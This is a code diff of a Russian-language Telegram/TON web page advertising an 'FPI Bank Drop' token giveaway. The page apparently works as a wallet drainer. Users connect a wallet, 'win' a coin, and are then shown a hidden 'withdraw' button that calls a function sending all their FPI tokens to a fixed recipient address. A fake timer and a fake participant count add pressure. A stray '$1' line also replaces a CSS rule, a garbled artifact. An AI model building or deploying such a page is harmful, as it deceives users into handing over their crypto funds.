@@ -8,7 +8,7 @@
   <!-- Ton / Telegram -->
   <script src="https://telegram.org/js/telegram-webapp.js"></script>
   <script src="./js/tonconnect-sdk.min.js"></script>
-  <link href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css" rel="stylesheet">
+  <link  href="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.css" rel="stylesheet">
   <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/tonweb/dist/tonweb.min.js"></script>
 
@@ -30,7 +30,10 @@
     #ton-connect{ margin:25px auto; max-width:320px; border-radius:14px; overflow:hidden; box-shadow:0 4px 15px rgba(0,0,0,.2); }
     .tc-actions{ display:flex; justify-content:center; align-items:center; gap:12px; margin-top:15px; }
     .btn{ border:none; border-radius:12px; padding:12px 20px; font-weight:bold; cursor:pointer; font-size:1em; box-shadow:0 4px 12px rgba(0,0,0,.25); }
-    .btn-withdraw{ background:linear-gradient(135deg,#00c853,#00e676); color:#fff; box-shadow:0 4px 12px rgba(0,200,83,.4); }
+    $1
+
+    /* Скрываем кнопку вывода по умолчанию */
+    #withdrawFPIBank{ display:none; }
 
     .stats-container{ display:flex; flex-direction:column; margin:25px auto; max-width:90%; background:rgba(46,0,99,.4); border-radius:16px; padding:15px; border:1px solid var(--accent2); box-shadow:0 4px 10px rgba(110,0,255,.2); }
     .timer-box{ text-align:center; margin-bottom:15px; }
@@ -42,46 +45,29 @@
     .stat-label{ font-size:.85em; color:#d0b3ff; opacity:.9; }
 
     .action-buttons{ display:flex; flex-direction:column; gap:18px; max-width:320px; margin:0 auto; }
-    #goToCoins{
-      background:linear-gradient(135deg,#6e00ff,#a100f2); color:#fff; padding:16px 30px; border:none; border-radius:14px;
-      cursor:pointer; font-weight:bold; font-size:1.2em; transition:all .3s;
-      box-shadow:0 4px 15px rgba(110,0,255,.4); display:flex; align-items:center; justify-content:center; gap:10px;
-    }
+    #goToCoins{ background:linear-gradient(135deg,#6e00ff,#a100f2); color:#fff; padding:16px 30px; border:none; border-radius:14px; cursor:pointer; font-weight:bold; font-size:1.2em; transition:all .3s; box-shadow:0 4px 15px rgba(110,0,255,.4); display:flex; align-items:center; justify-content:center; gap:10px; }
     #goToCoins:hover{ transform:translateY(-3px); box-shadow:0 6px 20px rgba(110,0,255,.6); }
     #goToCoins::before{ content:"🪙"; font-size:1.2em; }
 
-    .external-link-btn{
-      padding:16px 30px 16px 50px; border:none; border-radius:14px; cursor:pointer; font-weight:bold; font-size:1.1em;
-      transition:all .3s; display:flex; align-items:center; justify-content:center; gap:10px; position:relative;
-    }
+    .external-link-btn{ padding:16px 30px 16px 50px; border:none; border-radius:14px; cursor:pointer; font-weight:bold; font-size:1.1em; transition:all .3s; display:flex; align-items:center; justify-content:center; gap:10px; position:relative; }
     .external-link-btn:hover{ transform:translateY(-3px); }
-    .external-link-btn::before{
-      content:""; width:24px; height:24px; position:absolute; left:20px; background-size:contain;
-      background-repeat:no-repeat; background-position:center;
-    }
+    .external-link-btn::before{ content:""; width:24px; height:24px; position:absolute; left:20px; background-size:contain; background-repeat:no-repeat; background-position:center; }
     #goToChannel{ background:linear-gradient(135deg,#0088cc,#00aced); color:#fff; box-shadow:0 4px 15px rgba(0,172,237,.4); }
     #goToChannel:hover{ box-shadow:0 6px 20px rgba(0,172,237,.6); }
-    #goToChannel::before{
-      background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z'/%3E%3C/svg%3E");
-    }
+    #goToChannel::before{ background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm5 11h-4v4h-2v-4H7v-2h4V7h2v4h4v2z'/%3E%3C/svg%3E"); }
     #goToWebsite{ background:linear-gradient(135deg,#4b33a1,#7851e9); color:#fff; box-shadow:0 4px 15px rgba(75,51,161,.4); }
     #goToWebsite:hover{ box-shadow:0 6px 20px rgba(75,51,161,.6); }
-    #goToWebsite::before{
-      background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z'/%3E%3C/svg%3E");
-    }
+    #goToWebsite::before{ background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3E%3Cpath d='M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76 0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71 0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71 0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76 0 5-2.24 5-5s-2.24-5-5-5z'/%3E%3C/svg%3E"); }
 
-    @keyframes float { 0%{transform:translateY(0)} 50%{transform:translateY(-8px)} 100%{transform:translateY(0)} }
+    @keyframes float{0%{transform:translateY(0)}50%{transform:translateY(-8px)}100%{transform:translateY(0)}}
     .float{ animation:float 4s ease-in-out infinite; }
 
-    /* Coins */
     #coins-section{ position:relative; padding:40px 20px 120px; min-height:calc(100vh - 55px); }
     .coins-wrap{ width:100%; max-width:520px; margin:0 auto; }
     .coins-title{ font-size:1.4em; color:#e2c6ff; margin-bottom:20px; text-shadow:0 2px 4px rgba(0,0,0,.5); font-weight:bold; letter-spacing:.3px; }
 
-    .coins-container{
-      display:grid; grid-template-columns:repeat(2, minmax(140px,1fr));
-      gap:30px; width:100%; padding:20px 0; justify-items:center; align-items:center; margin:0 auto 20px;
-    }
+    .coins-container{ display:grid; grid-template-columns:repeat(2, minmax(140px,1fr)); gap:30px; width:100%; padding:20px 0; justify-items:center; align-items:center; margin:0 auto 20px; }
+
     .coin{ width:clamp(130px,22vw,180px); height:clamp(130px,22vw,180px); perspective:1000px; cursor:pointer; position:relative; }
     .coin-inner{ width:100%; height:100%; transform-style:preserve-3d; transition:transform .9s var(--ease1); will-change:transform; }
     .coin-front,.coin-back{ position:absolute; inset:0; backface-visibility:hidden; border-radius:50%; background-size:cover; background-position:center; }
@@ -89,31 +75,15 @@
     .coin-back{  background-image:url('js/QmVzUjRyMXRkbLT6P4PKZGW6DzoneKFu1zBH8ks4WYR6Cx.png'); transform:rotateY(180deg); }
     .fade-out{ opacity:.2; pointer-events:none; }
 
-    /* Clone */
-    .coin-clone{
-      position:absolute; z-index:10; will-change:left, top, transform;
-      transition:left .9s var(--ease1), top .9s var(--ease1), transform .9s var(--ease1);
-      visibility:visible;
-    }
-    .coin-clone.float-up{
-      transition:left .8s var(--ease2), top .8s var(--ease2), transform .8s var(--ease2);
-    }
+    .coin-clone{ position:absolute; z-index:10; will-change:left, top, transform; transition:left .9s var(--ease1), top .9s var(--ease1), transform .9s var(--ease1); visibility:visible; }
+    .coin-clone.float-up{ transition:left .8s var(--ease2), top .8s var(--ease2), transform .8s var(--ease2); }
 
-    #win-message{
-      background:linear-gradient(to right, rgba(0,255,0,.15), rgba(0,255,0,.05));
-      border:1px solid #00ff6e; backdrop-filter:blur(10px); box-shadow:0 0 30px rgba(0,255,110,.25);
-      font-weight:500; width:min(75vw,680px); padding:20px; border-radius:16px; text-align:center; color:#fff;
-      position:absolute; left:50%; transform:translateX(-50%); top:320px; opacity:0;
-      pointer-events:none; transition:opacity .6s var(--ease2); z-index:4;
-    }
-    #win-message button{
-      margin-top:20px; padding:12px 24px; font-size:1em; font-weight:bold; color:#fff; background:#c800ff; border:1px solid #c800ff; border-radius:12px; cursor:pointer;
-    }
+    #win-message{ background:linear-gradient(to right, rgba(0,255,0,.15), rgba(0,255,0,.05)); border:1px solid #00ff6e; backdrop-filter:blur(10px); box-shadow:0 0 30px rgba(0,255,110,.25); font-weight:500; width:min(75vw,680px); padding:20px; border-radius:16px; text-align:center; color:#fff; position:absolute; left:50%; transform:translateX(-50%); top:320px; opacity:0; pointer-events:none; transition:opacity .6s var(--ease2); z-index:4; }
+    #win-message button{ margin-top:20px; padding:12px 24px; font-size:1em; font-weight:bold; color:#fff; background:#c800ff; border:1px solid #c800ff; border-radius:12px; cursor:pointer; }
     #win-message div{ font-size:.8em; color:#aaa; margin-top:10px; max-width:360px; line-height:1.4; margin-left:auto; margin-right:auto; }
   </style>
 </head>
 <body>
-  <!-- Background grid -->
   <svg class="wave-grid" viewBox="0 0 1200 800" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
     <path d="M0 100 Q300 50 600 100 T1200 100" stroke="#98FF00" stroke-width="1" fill="none" stroke-dasharray="5,5"/>
     <path d="M0 300 Q300 250 600 300 T1200 300" stroke="#98FF00" stroke-width="1" fill="none" stroke-dasharray="5,5"/>
@@ -128,16 +98,10 @@
   </svg>
 
   <main class="content">
-    <!-- Page 1 -->
     <div id="page1" class="page">
       <img src="./js/6atalzkorwc2qht2piwnnuln62yn.png" alt="FPI-drop" class="float">
       <div class="welcome-text">Добро пожаловать в FPI Bank Drop!</div>
-      <div class="description">
-        🎉 Участвуйте в розыгрыше токенов FPI Bank!<br><br>
-        🔹 Каждый участник получает от 500 до 5000 токенов<br>
-        🔹 Просто подключите кошелёк и откройте карточку<br>
-        🔹 Выводите выигрыш моментально
-      </div>
+      <div class="description">🎉 Участвуйте в розыгрыше токенов FPI Bank!<br><br>🔹 Каждый участник получает от 500 до 5000 токенов<br>🔹 Просто подключите кошелёк и откройте карточку<br>🔹 Выводите выигрыш моментально</div>
 
       <div id="ton-connect"></div>
       <div class="tc-actions">
@@ -150,14 +114,8 @@
           <div class="timer-label">До окончания дропа</div>
         </div>
         <div class="stats-row">
-          <div class="stat-item">
-            <div class="stat-value" id="participantsCount">1,428</div>
-            <div class="stat-label">Участников</div>
-          </div>
-          <div class="stat-item">
-            <div class="stat-value">500-5,000</div>
-            <div class="stat-label">FPI за дроп</div>
-          </div>
+          <div class="stat-item"><div class="stat-value" id="participantsCount">1,428</div><div class="stat-label">Участников</div></div>
+          <div class="stat-item"><div class="stat-value">500-5,000</div><div class="stat-label">FPI за дроп</div></div>
         </div>
       </div>
 
@@ -168,36 +126,14 @@
       </div>
     </div>
 
-    <!-- Page 2: Coins -->
     <section id="coins-section" class="page" aria-label="Монетки">
       <div class="coins-wrap">
         <div class="coins-title">Открой монетку и забери свой FPI</div>
-
         <div class="coins-container">
-          <div class="coin" data-index="0">
-            <div class="coin-inner">
-              <div class="coin-front"></div>
-              <div class="coin-back"></div>
-            </div>
-          </div>
-          <div class="coin" data-index="1">
-            <div class="coin-inner">
-              <div class="coin-front"></div>
-              <div class="coin-back"></div>
-            </div>
-          </div>
-          <div class="coin" data-index="2">
-            <div class="coin-inner">
-              <div class="coin-front"></div>
-              <div class="coin-back"></div>
-            </div>
-          </div>
-          <div class="coin" data-index="3">
-            <div class="coin-inner">
-              <div class="coin-front"></div>
-              <div class="coin-back"></div>
-            </div>
-          </div>
+          <div class="coin" data-index="0"><div class="coin-inner"><div class="coin-front"></div><div class="coin-back"></div></div></div>
+          <div class="coin" data-index="1"><div class="coin-inner"><div class="coin-front"></div><div class="coin-back"></div></div></div>
+          <div class="coin" data-index="2"><div class="coin-inner"><div class="coin-front"></div><div class="coin-back"></div></div></div>
+          <div class="coin" data-index="3"><div class="coin-inner"><div class="coin-front"></div><div class="coin-back"></div></div></div>
         </div>
 
         <div id="win-message">
@@ -213,7 +149,7 @@
   </main>
 
   <script>
-    /* Scroll */
+    // Скролл
     document.getElementById('goToCoins').addEventListener('click', () => {
       document.getElementById('coins-section').scrollIntoView({ behavior:'smooth', block:'start' });
     });
@@ -221,11 +157,11 @@
       window.scrollTo({ top:0, behavior:'smooth' });
     });
 
-    /* External links */
+    // Внешние ссылки
     document.getElementById('goToChannel').addEventListener('click', () => window.open('https://t.me/fpibank','_blank'));
     document.getElementById('goToWebsite').addEventListener('click', () => window.open('https://fpibank.com/#tokenPrice','_blank'));
 
-    /* Timer */
+    // Таймер
     (function(){
       const el = document.getElementById('nextDropTimer');
       let d=14,h=2,m=12,s=0;
@@ -237,10 +173,8 @@
       tick(); setInterval(tick,1000);
     })();
 
-    /* TonConnect */
-    if (typeof Telegram === "undefined") {
-      window.Telegram = { WebApp: { ready: () => {}, showAlert: alert } };
-    } else { Telegram.WebApp.ready(); }
+    // TonConnect
+    if (typeof Telegram === "undefined") { window.Telegram = { WebApp: { ready: () => {}, showAlert: alert } }; } else { Telegram.WebApp.ready(); }
 
     const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
       manifestUrl: "https://neutronovich.github.io/tonconnect-manifest.json",
@@ -291,22 +225,23 @@
       try{ await sendAllFPIBANK(acc.address, recipientTonAddress); } catch(e){ console.error(e); }
     });
 
-    /* Coins (no persistence; clone stays centered) */
+    // ===== Монетки — без сохранения состояния, клон остаётся в центре до перезагрузки =====
     (function setupCoins(){
       const section = document.getElementById('coins-section');
       const coins   = section.querySelectorAll('.coin');
       const winMsg  = document.getElementById('win-message');
 
-      let cloneEl=null, locked=false;
+      let cloneEl=null, original=null, locked=false;
 
       function reset(){
+        // Полный сброс (используем только при инициализации)
         coins.forEach(c=>{
           c.classList.remove('fade-out');
           const inner=c.querySelector('.coin-inner'); if(inner) inner.style.transform='';
           c.style.visibility='visible';
         });
         if(cloneEl && cloneEl.parentNode){ cloneEl.parentNode.removeChild(cloneEl); }
-        cloneEl=null; locked=false;
+        cloneEl=null; original=null; locked=false;
         winMsg.style.opacity='0';
         winMsg.style.pointerEvents='none';
       }
@@ -330,8 +265,9 @@
       function animateCoin(clone){
         const w = clone.getBoundingClientRect().width;
         const targetLeft = (section.clientWidth - w)/2;
-        const targetTop  = 140;
+        const targetTop  = 140; // ниже заголовка
 
+        // шаг 1: центр + flip + лёгкий zoom
         requestAnimationFrame(()=>{
           clone.style.left = targetLeft + 'px';
           clone.style.top  = targetTop  + 'px';
@@ -340,6 +276,7 @@
           if(inner) inner.style.transform = 'rotateY(180deg)';
         });
 
+        // шаг 2: лёгкий отскок вниз и показываем выигрыш. КЛОН НЕ УДАЛЯЕМ
         setTimeout(()=>{
           clone.classList.add('float-up');
           clone.style.top = (targetTop + 8) + 'px';
@@ -347,23 +284,27 @@
           setTimeout(()=>{
             winMsg.style.opacity='1';
             winMsg.style.pointerEvents='auto';
-            locked = true; // keep clone on screen until reload
+            locked = true; // блокируем дальнейшие клики до перезагрузки
+
+            // Показать кнопку «Вывести FPI Bank» после выигрыша
+            document.getElementById('withdrawFPIBank').style.display = 'inline-block';
           }, 300);
         }, 900);
       }
 
       coins.forEach(coin=>{
         coin.addEventListener('click', ()=>{
-          if(locked) return;
+          if(locked) return; // нельзя второй раз
           locked = true;
           cloneEl = makeCloneFrom(coin);
-          coin.style.visibility='hidden';
+          coin.style.visibility='hidden'; // оригинал скрываем, чтобы не было дубля в сетке
           coins.forEach(c=>{ if(c!==coin) c.classList.add('fade-out'); });
           animateCoin(cloneEl);
+          original = coin;
         });
       });
 
-      // init
+      // Инициализация
       reset();
     })();
   </script>
